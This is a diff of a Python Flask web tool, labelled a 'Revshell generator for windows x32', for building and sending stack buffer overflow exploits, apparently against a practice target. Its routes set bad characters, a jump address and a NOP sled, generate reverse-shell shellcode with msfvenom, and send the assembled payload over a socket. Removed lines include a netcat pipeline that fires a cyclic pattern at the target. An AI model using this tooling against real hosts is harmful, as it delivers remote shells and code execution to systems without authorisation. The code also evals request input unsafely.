@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
 import argparse
 from flask import Flask, request, json, request, send_file, render_template
@@ -17,11 +17,9 @@ cache.init_app(app=api,
                    "CACHE_TYPE": "filesystem",
                    'CACHE_DIR': '/tmp/cache',
                    "CACHE_DEFAULT_TIMEOUT": 9999999999,
-                   "DEBUG": True,
-                   "doesntexist": "test"
+                   "DEBUG": True
                }
                )
-
 redirect = '''<meta http-equiv="refresh" content="0;url=/">'''
 parser = argparse.ArgumentParser(
     description='Revshell generator for windows x32')
@@ -54,12 +52,10 @@ def get_adapters_ip(network_adapter):
 
 def get_bad_chars(raw=False):
     raw_bad_chars = cache.get("bad_chars")
-    # print("get_bad_chars", type(raw_bad_chars[0]))
     if raw:
         return raw_bad_chars
     bad_chars = []
     for bad_char in raw_bad_chars:
-        # print('get_bad_chars', type(bad_char))
         bad_chars.append(format(ord(bad_char), '#04x'))
     bad_chars = list(sorted(set(bad_chars)))
     return bad_chars
@@ -71,28 +67,14 @@ def shutdown_server():
         raise RuntimeError('Not running with the Werkzeug Server')
     func()
 
-# def generate_bad_chars(bad_chars_array=[]):
-#     filterd = b""
-#     print(bad_chars_array)
-#     for i in range(0x00, 0x100):
-#         if not i in "".join(bad_chars_array).encode('latin-1'):
-#             filterd += chr(i).encode('latin-1')
-#         else:
-#             print(i)
-#     return filterd
-
 
 def generate_bad_chars(bad_chars_array=[]):
     filterd = b""
     for i in range(0x00, 0x100):
-        # print(chr(i).encode('latin-1'))
-        # print("".join(bad_chars_array).encode('latin-1'), i, 'testing...')
         if not (i in b"".join(bad_chars_array)):
             filterd += chr(i).encode('latin-1')
         else:
             pass
-            # print(i)
-    # print(filterd)
     return filterd
 
 
@@ -113,9 +95,6 @@ cache.set("port", "1337")
 cache.set("pre_msg", "OVERFLOW1 ")
 cache.set("post_msg", "")
 cache.set("bad_chars", [b"\x00", b"\x0a"])
-# a = cache.get('bad_chars')[0]
-# print(type(a), a)
-# print(get_bad_chars(True))
 
 
 @api.route("/generate_opcodes")
@@ -141,10 +120,8 @@ jmp esp
             for j in range(0, len(i) - 1, 2):
                 opcodes_string += "\\x" + i[j:j+2]
         opcodes_string = opcodes_string.replace(
-            "\\x00", '')  # .replace("\\xFF", '')
-    # print(opcodes_string)
+            "\\x00", '')
     bad_chars = "".join(get_bad_chars()).replace('0x', r'\x')
-    # print(bad_chars)
     mona_string = '!mona find -s "' + opcodes_string + '" -cpb "' + bad_chars + '"'
     mona_optional = mona_string + ' -m "abc.dll"'
 
@@ -165,16 +142,7 @@ def set_bad_chars():
     for i in bad_chars:
         test = f"b'{i}'".replace(r"'0x", r"'\x")
         test = eval(test)
-        # print(type(test), test)
         bad_chars_final.append(test)
-
-    # for i in ['[', ']', ' ']:
-    #     bad_chars = bad_chars.replace(i, "")
-    # print(bad_chars)
-    # print(bad_chars_final)
-    # print(type(bad_chars_final[0]))
-    # print(cache.get('bad_chars')[0], bad_chars_final[0])
-    # print(cache.get('bad_chars'), "\n" + str(bad_chars_final))
     cache.set("bad_chars", bad_chars_final)
     return f"bad chars = " + str(get_bad_chars()) + redirect
 
@@ -197,11 +165,6 @@ def send_payload(payload):
         pre_msg = b''
     if post_msg is None:
         post_msg = b''
-
-    # with open('/tmp/payload.txt', 'wb') as f:
-    #     f.write(payload)
-    # command += 'printf "' + pre_msg + \
-    #     "$(/usr/bin/cat /tmp/payload.txt)" + post_msg + '"'
     command = pre_msg.encode('latin-1')
     if type(payload) is None:
         pass
@@ -216,11 +179,6 @@ def send_payload(payload):
     s.connect((ip, int(port)))
     s.send(command)
     s.close()
-    # command += ' | /usr/bin/nc '
-    # command += cache.get('ip') + " "
-    # command += str(cache.get('port'))
-    # command += '; pkill nc'
-    # os_execute(command, feedback=False)
     return command
 
 
@@ -229,19 +187,11 @@ def send_payload_web():
     create_payload()
     send_payload(cache.get('payload'))
     return 'done'
-# @api.route("/set_payload_length")
-# def run_patern():
-#     offset = cache.get('set_payload_length')
-#     print(offset)
-#     patern = os.popen(f'/usr/bin/msf-pattern_create -l ' +
-#                       str(offset)).read().strip()
-#     command = send_payload(patern)
 
 
 @api.route("/set_payload_length")
 def run_offset():
     if request.method == "GET" or request.method == "POST":
-        # cache.set("prefix", int(request.args.get("prefix")))
         cache.set("payload_length", int(
             request.args.get("set_payload_length")))
         payload_length = str(cache.get("payload_length"))
@@ -251,7 +201,6 @@ def run_offset():
 @api.route("/set_nop_sled_length")
 def set_nop_sled_length():
     if request.method == "GET" or request.method == "POST":
-        # cache.set("prefix", int(request.args.get("prefix")))
         cache.set("nop_sled_length", int(
             request.args.get("set_nop_sled_length")))
         nop_sled_length = str(cache.get("nop_sled_length"))
@@ -312,20 +261,10 @@ def generate_shellcode():
     msfvenom = "/usr/bin/msfvenom " + cmd
     msfvenom_output = os_execute(msfvenom)
     shellcode = b''
-    # print(msfvenom_output)
     for i in msfvenom_output.strip().split('\n'):
         shellcode += eval("b'" + i.split('"')[-2] + "'")
     cache.set('shellcode', shellcode)
     return ":)" + redirect
-
-# def get_offset(patern_feedback='0x46367046'):
-#     msf_pat_fb = "/usr/bin/msf-pattern_offset -q " + patern_feedback
-#     offset = os.popen(msf_pat_fb).read()
-#     if "[*] Exact" in offset:
-#         offset = int(offset.split(' ')[-1])
-#     else:
-#         raise("patern is incorrect / not found. ")
-#     return offset
 
 
 def get_ip_port():
@@ -352,7 +291,6 @@ def double_val(val1, val2):
 
 def single_val(val):
     val_without_spaces = val.replace(' ', '_')
-    # print(val_without_spaces)
     uri_name = f"{val_without_spaces}"
     return f"""<form action="/{uri_name}">
 <label for="{val_without_spaces}">{val}:</label>
@@ -363,7 +301,6 @@ def single_val(val):
 
 def single_button(val):
     val_without_spaces = val.replace(' ', '_')
-    # print(val_without_spaces)
     uri_name = f"{val_without_spaces}"
     return f"""<form action="/{uri_name}">
 <input type="submit" value="run {uri_name}">
@@ -397,7 +334,6 @@ def send_patern():
 @api.route('/pre_msg')
 def pre_msg():
     if request.method == "GET" or request.method == "POST":
-        # cache.set("prefix", int(request.args.get("prefix")))
         cache.set("pre_msg",
                   request.args.get("pre_msg").replace('\\n', '\n')
                   )
@@ -439,7 +375,6 @@ def create_payload():
         pass
 
     try:
-        # print(cache.get('jump_adress'))
         payload += cache.get('jump_adress')
     except:
         pass
@@ -473,9 +408,6 @@ def set_jump_adress():
         jump_adress = request.args.get("set_jump_adress")
         cache.set("jump_adress", p32(eval(f"0x{jump_adress}")))
         jump_adress = cache.get("jump_adress")
-        # cache.set("jump_adress",
-        #           request.args.get("set_jump_adres")
-        #           )
         return f"Jump adress set to: {jump_adress}" + redirect
 
 
@@ -490,7 +422,6 @@ def send_bad_chars():
 
 @api.route("/")
 def home():
-    # main
     t = '&emsp;'
     menu = "<html><body>"
     menu += cache_get_without_error("ip", f"- Target: " + 7*t,
@@ -505,7 +436,6 @@ def home():
         menu += cache_get_without_error("jump_adress",
                                         pre_string="</br>- Jump adress: " + t*4,
                                         post_string='')
-        # from pwn import unpack_many
     except:
         pass
 
@@ -537,7 +467,6 @@ def home():
     menu += single_val("generate_opcodes")
     menu += single_val("set_jump_adress")
     menu += single_val("set_nop_sled_length")
-    # menu += additional_info()
     menu += """<form action="/generate_shellcode" method="POST">
     Generate payload: 
     <select name="shelltype" id="myselect" onchange="this.form.submit()">
@@ -554,22 +483,6 @@ def home():
     return menu
 
 
-# @api.route('/gen_bad_chars')
-# def gen_bad_chars():
-#     if request.method == "GET" or request.method == "POST":
-#         # cache.set("cannot_use_chars", request.args.get("cannot_use_chars"))
-#         with open('bad_chars.txt', mode="wb") as f:
-#             bytes_to_write = b""
-#             for i in bytes(range(0, 256)):
-#                 if chr(i) in cache.get("bad_chars"):
-#                     continue
-#                 print(i)
-#                 bytes_to_write += bytes(i)
-
-#             f.write(bytes_to_write)
-#         return "bad_chars.txt generated."
-
-
 @api.route('/download_bad_chars')
 def download_bad_chars():
     with open('bad_chars.txt', mode="wb") as f:
@@ -579,7 +492,4 @@ def download_bad_chars():
 
 
 cache.set('lport', args.lport)
-# generate_shellcode(lport=str(args.lport), adapter_name=args.ltun)
 api.run(host="0.0.0.0", port=5000)
-# msf-pattern_create -l 3000 | xargs -I {} printf "OVERFLOW1 {}" | nc $(cat ip) 1337
-# msf-pattern_offset -q 6F43396E
